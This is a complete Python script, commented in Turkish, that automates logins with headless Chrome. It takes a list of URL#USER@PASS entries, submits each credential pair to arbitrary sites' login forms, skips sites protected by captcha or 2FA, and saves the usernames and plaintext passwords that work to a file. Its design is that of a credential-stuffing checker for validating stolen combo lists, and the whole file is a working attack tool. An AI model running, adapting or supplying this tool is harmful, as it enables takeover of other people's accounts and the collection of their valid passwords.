#!/usr/bin/env python3
"""
Windows Uyumlu Selenium Credential Tester
Chrome 146+ desteği ile
"""

import sys
import time
import warnings
from datetime import datetime
from urllib.parse import urlparse

warnings.filterwarnings('ignore')

# Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
except ImportError:
    print("[!] Selenium kurulu değil!")
    print("[i] Kurulum: pip install selenium")
    sys.exit(1)


class WindowsCredentialTester:
    def __init__(self, success_file="successful_logins.txt", fail_file="failed_logins.txt", timeout=20):
        self.success_file = success_file
        self.fail_file = fail_file
        self.timeout = timeout
        self.success_count = 0
        self.fail_count = 0
        self.driver = None
        
        # Logout tespit desenleri
        self.logout_patterns = [
            'logout', 'log out', 'signout', 'sign out', 
            'exit', 'quit', 'çıkış', 'çık', 'odhlásit', 
            'déconnexion', 'salir', 'ausloggen'
        ]
        
        # Captcha/2FA tespit desenleri
        self.captcha_patterns = [
            'captcha', 'recaptcha', 'g-recaptcha', 
            '2fa', 'two factor', 'two-factor', 'authentication code',
            'doğrulama kodu', 'verification code', 'sms kodu',
            'güvenlik kodu', 'security code'
        ]
    
    def init_driver(self):
        """Windows için Chrome'u başlat"""
        try:
            chrome_options = Options()
            
            # Headless mod (arkaplanda çalış)
            chrome_options.add_argument('--headless=new')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-setuid-sandbox')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            
            # User agent
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36')
            
            # Resimleri devre dışı bırak (hızlı yükleme)
            prefs = {
                'profile.managed_default_content_settings.images': 2,
                'profile.default_content_setting_values.notifications': 2
            }
            chrome_options.add_experimental_option('prefs', prefs)
            
            # ChromeDriver yolu - AYNI KLASÖRDE chromedriver.exe OLMALI
            chromedriver_paths = [
                'chromedriver.exe',                                    # Aynı klasör
                './chromedriver.exe',                                  # Aynı klasör (unix style)
                r'C:\WebDriver\chromedriver.exe',                     # C:\WebDriver
                r'C:\Windows\System32\chromedriver.exe',             # System32
                r'C:\chromedriver\chromedriver.exe',                # C:\chromedriver
            ]
            
            driver_path = None
            for path in chromedriver_paths:
                try:
                    import os
                    if os.path.exists(path):
                        driver_path = path
                        print(f"[*] ChromeDriver bulundu: {path}")
                        break
                except:
                    continue
            
            if not driver_path:
                print("[!] ChromeDriver bulunamadı!")
                print("[i] chromedriver.exe'yi bu klasöre kopyalayın:")
                print(f"    {os.getcwd()}")
                print("[i] İndir: https://chromedriver.chromium.org/downloads")
                print("[i] Sürüm: Chrome 146.0.7680.80 = ChromeDriver 146.x")
                return False
            
            service = Service(driver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(self.timeout)
            
            return True
            
        except WebDriverException as e:
            print(f"[!] Chrome Driver Hatası: {e}")
            if "executable needs to be in path" in str(e).lower():
                print("[i] chromedriver.exe'yi PATH'e ekleyin veya kodun yanına koyun")
            elif "session not created" in str(e).lower():
                print("[i] ChromeDriver sürümü Chrome ile uyumsuz!")
                print("[i] Chrome sürümünüz: 146.0.7680.80")
                print("[i] ChromeDriver 146.x indirin")
            return False
        except Exception as e:
            print(f"[!] Chrome başlatma hatası: {e}")
            return False
    
    def close_driver(self):
        """Chrome'u kapat"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def parse_line(self, line):
        """URL#USER@PASS formatını parse et"""
        try:
            line = line.strip()
            if not line or line.startswith('#'):
                return None
            
            if '#' not in line or '@' not in line:
                return None
            
            url_part, cred_part = line.split('#', 1)
            username, password = cred_part.rsplit('@', 1)
            
            url = url_part.strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            return {
                'url': url,
                'username': username.strip(),
                'password': password.strip()
            }
        except Exception as e:
            print(f"[!] Parse hatası: {line} - {e}")
            return None
    
    def check_captcha_or_2fa(self, page_source):
        """Captcha veya 2FA kontrolü"""
        page_lower = page_source.lower()
        
        for pattern in self.captcha_patterns:
            if pattern in page_lower:
                return True, pattern
        
        # Görsel captcha kontrolü (img etiketleri içinde captcha kelimesi)
        if '<img' in page_lower and 'captcha' in page_lower:
            return True, 'image_captcha'
        
        # iframe içinde recaptcha
        if 'recaptcha' in page_lower or 'grecaptcha' in page_lower:
            return True, 'recaptcha'
        
        return False, None
    
    def attempt_login(self, cred_info):
        """Gerçek tarayıcıda giriş dene"""
        url = cred_info['url']
        username = cred_info['username']
        password = cred_info['password']
        
        print(f"\n{'='*70}")
        print(f"[*] Test ediliyor: {url}")
        print(f"[*] Kullanıcı: {username}")
        print(f"[*] Şifre: {'*' * min(len(password), 15)}")
        print(f"{'='*70}")
        
        result_data = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'url': url,
            'username': username,
            'password': password,
            'success': False,
            'score': 0,
            'final_url': '',
            'error': None,
            'reason': []
        }
        
        try:
            # Driver'ı başlat
            if not self.driver:
                if not self.init_driver():
                    result_data['error'] = 'ChromeDriver başlatılamadı'
                    self.save_result(result_data, False)
                    return result_data
            
            # Sayfaya git
            print(f"[*] Sayfa yükleniyor...")
            self.driver.get(url)
            time.sleep(3)  # JavaScript yüklenmesini bekle
            
            # Captcha/2FA kontrolü
            page_source = self.driver.page_source
            has_captcha, captcha_type = self.check_captcha_or_2fa(page_source)
            
            if has_captcha:
                print(f"[!] 🚫 Captcha/2FA tespit edildi: {captcha_type}")
                print(f"[!] Bu site atlanıyor...")
                result_data['error'] = f'Captcha/2FA: {captcha_type}'
                result_data['reason'].append('Captcha veya 2FA var')
                self.save_result(result_data, False)
                return result_data
            
            # Form elemanlarını bul
            print(f"[*] Login formu aranıyor...")
            
            username_field = None
            password_field = None
            submit_button = None
            
            # Şifre alanını bul
            try:
                password_field = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
            except NoSuchElementException:
                # Alternatif seçiciler
                try:
                    password_field = self.driver.find_element(By.CSS_SELECTOR, "input[name*='pass']")
                except:
                    try:
                        password_field = self.driver.find_element(By.CSS_SELECTOR, "input[id*='pass']")
                    except:
                        pass
            
            if not password_field:
                print(f"[!] Şifre alanı bulunamadı")
                result_data['error'] = 'Login formu bulunamadı'
                self.save_result(result_data, False)
                return result_data
            
            # Kullanıcı adı alanını bul
            try:
                username_field = self.driver.find_element(By.CSS_SELECTOR, "input[type='text']")
            except:
                try:
                    username_field = self.driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                except:
                    try:
                        username_field = self.driver.find_element(By.CSS_SELECTOR, "input[name*='user']")
                    except:
                        try:
                            username_field = self.driver.find_element(By.CSS_SELECTOR, "input[name*='email']")
                        except:
                            pass
            
            # Submit butonunu bul
            try:
                submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            except:
                try:
                    submit_button = self.driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
                except:
                    # Text içeren butonlar
                    buttons = self.driver.find_elements(By.TAG_NAME, "button")
                    for btn in buttons:
                        btn_text = btn.text.lower()
                        if any(word in btn_text for word in ['login', 'log in', 'sign in', 'giris', 'giriş', 'submit']):
                            submit_button = btn
                            break
            
            print(f"[*] Form bulundu ✓")
            if username_field:
                print(f"    - Username: {username_field.get_attribute('name')}")
            print(f"    - Password: {password_field.get_attribute('name')}")
            
            # Bilgileri doldur
            if username_field:
                username_field.clear()
                username_field.send_keys(username)
                time.sleep(0.5)
            
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(0.5)
            
            # Gönder
            print(f"[*] Giriş yapılıyor...")
            if submit_button:
                submit_button.click()
            else:
                password_field.submit()
            
            # Sayfanın yüklenmesini bekle
            time.sleep(4)
            
            # Sonucu analiz et
            result_data['final_url'] = self.driver.current_url
            final_source = self.driver.page_source.lower()
            final_url_lower = result_data['final_url'].lower()
            
            print(f"[*] Final URL: {result_data['final_url']}")
            
            # Captcha çıktı mı (giriş sonrası)?
            has_captcha_after, captcha_type_after = self.check_captcha_or_2fa(self.driver.page_source)
            if has_captcha_after:
                print(f"[!] 🚫 Giriş sonrası Captcha/2FA: {captcha_type_after}")
                result_data['error'] = f'Post-login Captcha/2FA: {captcha_type_after}'
                result_data['reason'].append('Giriş sonrası captcha/2FA')
                self.save_result(result_data, False)
                return result_data
            
            # Logout kontrolü (en güvenilir gösterge)
            has_logout = False
            for pattern in self.logout_patterns:
                if pattern in final_source or pattern in final_url_lower:
                    has_logout = True
                    break
            
            # Hala login sayfasında mı?
            on_login_page = any(keyword in final_url_lower for keyword in ['login', 'signin', 'log-in', 'sign-in', 'auth'])
            
            # Skor hesapla
            score = 0
            if has_logout: score += 10
            if not on_login_page: score += 5
            
            result_data['score'] = score
            
            print(f"\n[*] Analiz:")
            print(f"    - Logout bulundu: {'✓ EVET' if has_logout else '✗ HAYIR'}")
            print(f"    - Login sayfasında: {'✓ EVET (KÖTÜ)' if on_login_page else '✗ HAYIR (İYİ)'}")
            print(f"    - Skor: {score}/15")
            
            # Başarılı mı?
            is_success = has_logout and not on_login_page
            result_data['success'] = is_success
            
            # Kaydet
            self.save_result(result_data, is_success)
            
            if is_success:
                self.success_count += 1
                print(f"\n[✅] BAŞARILI GİRİŞ TESPİT EDİLDİ!")
                print(f"    Dosya: {self.success_file}")
            else:
                self.fail_count += 1
                reason = []
                if on_login_page:
                    reason.append("Hala login sayfasında")
                if not has_logout:
                    reason.append("Logout linki yok")
                result_data['reason'] = reason
                print(f"\n[❌] BAŞARISIZ: {', '.join(reason)}")
                print(f"    Dosya: {self.fail_file}")
            
            return result_data
            
        except TimeoutException:
            print(f"[!] ⏱️ Zaman aşımı ({self.timeout}s)")
            result_data['error'] = f'Zaman aşımı ({self.timeout}s)'
            self.save_result(result_data, False)
            return result_data
            
        except WebDriverException as e:
            print(f"[!] WebDriver hatası: {e}")
            result_data['error'] = str(e)
            self.save_result(result_data, False)
            # Driver'ı yeniden başlatmayı dene
            try:
                self.close_driver()
                self.init_driver()
            except:
                pass
            return result_data
            
        except Exception as e:
            print(f"[!] Hata: {e}")
            result_data['error'] = str(e)
            self.save_result(result_data, False)
            return result_data
    
    def save_result(self, result, is_success):
        """Sonucu dosyaya kaydet (ANINDA)"""
        try:
            if is_success:
                with open(self.success_file, 'a', encoding='utf-8') as f:
                    if f.tell() == 0:
                        f.write("="*70 + "\n")
                        f.write("✅ BAŞARILI GİRİŞLER (Real Browser)\n")
                        f.write("="*70 + "\n\n")
                    
                    f.write(f"\n{'='*70}\n")
                    f.write(f"[✅] BAŞARILI GİRİŞ\n")
                    f.write(f"{'='*70}\n")
                    f.write(f"Zaman: {result['timestamp']}\n")
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Kullanıcı: {result['username']}\n")
                    f.write(f"Şifre: {result['password']}\n")
                    f.write(f"Skor: {result['score']}/15\n")
                    f.write(f"Final URL: {result['final_url']}\n")
                    f.write(f"{'='*70}\n")
            else:
                with open(self.fail_file, 'a', encoding='utf-8') as f:
                    if f.tell() == 0:
                        f.write("="*70 + "\n")
                        f.write("❌ BAŞARISIZ GİRİŞLER\n")
                        f.write("="*70 + "\n\n")
                    
                    f.write(f"\n{'='*70}\n")
                    f.write(f"[❌] BAŞARISIZ\n")
                    f.write(f"{'='*70}\n")
                    f.write(f"Zaman: {result['timestamp']}\n")
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Kullanıcı: {result['username']}\n")
                    f.write(f"Şifre: {result['password']}\n")
                    
                    if result.get('reason'):
                        f.write(f"Neden: {', '.join(result['reason'])}\n")
                    if result.get('error'):
                        f.write(f"Hata: {result['error']}\n")
                    
                    f.write(f"{'='*70}\n")
        except Exception as e:
            print(f"[!] Kayıt hatası: {e}")
    
    def run_from_file(self, filename):
        """Dosyadan oku ve test et"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"[!] Dosya okuma hatası: {e}")
            return
        
        print(f"\n{'='*70}")
        print(f"[*] Windows Selenium Credential Tester")
        print(f"[*] Toplam: {len(lines)} site")
        print(f"[*] Başarılı: {self.success_file}")
        print(f"[*] Başarısız: {self.fail_file}")
        print(f"{'='*70}\n")
        
        # Chrome'u başlat
        if not self.init_driver():
            print("[!] Chrome başlatılamadı, çıkılıyor...")
            return
        
        try:
            for i, line in enumerate(lines, 1):
                print(f"\n[{i}/{len(lines)}] Test ediliyor...")
                
                cred_info = self.parse_line(line)
                if cred_info:
                    self.attempt_login(cred_info)
                else:
                    print(f"[!] Geçersiz format: {line}")
                
                # Sonraki siteye geçmeden önce bekle
                if i < len(lines):
                    time.sleep(2)
                    
        except KeyboardInterrupt:
            print("\n[!] Kullanıcı tarafından durduruldu")
        finally:
            self.close_driver()
        
        print(f"\n{'='*70}")
        print(f"[*] TAMAMLANDI")
        print(f"[✅] Başarılı: {self.success_count}")
        print(f"[❌] Başarısız: {self.fail_count}")
        print(f"{'='*70}\n")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Windows Selenium Credential Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnek kullanım:
  python login_tester_windows.py liste.txt
  python login_tester_windows.py liste.txt -s calisan.txt -f calismayan.txt
  python login_tester_windows.py liste.txt --timeout 30

ChromeDriver Kurulumu:
  1. Chrome sürümünü öğren: chrome://version/ (örn: 146.0.7680.80)
  2. İndir: https://chromedriver.chromium.org/downloads
  3. chromedriver.exe'yi bu klasöre kopyala
  4. VEYA C:\Windows\System32\ içine at

Dosya Formatı:
  URL#KULLANICI@ŞIFRE
  Örnek: http://site.com/admin#admin@password123
        """
    )
    
    parser.add_argument('file', help='Test edilecek sitelerin listesi (URL#USER@PASS)')
    parser.add_argument('-s', '--success', default='successful_logins.txt', help='Başarılı girişler dosyası')
    parser.add_argument('-f', '--fail', default='failed_logins.txt', help='Başarısız girişler dosyası')
    parser.add_argument('--timeout', type=int, default=20, help='Zaman aşımı (saniye) [varsayılan: 20]')
    
    args = parser.parse_args()
    
    tester = WindowsCredentialTester(
        success_file=args.success,
        fail_file=args.fail,
        timeout=args.timeout
    )
    
    tester.run_from_file(args.file)


if __name__ == '__main__':
    main()
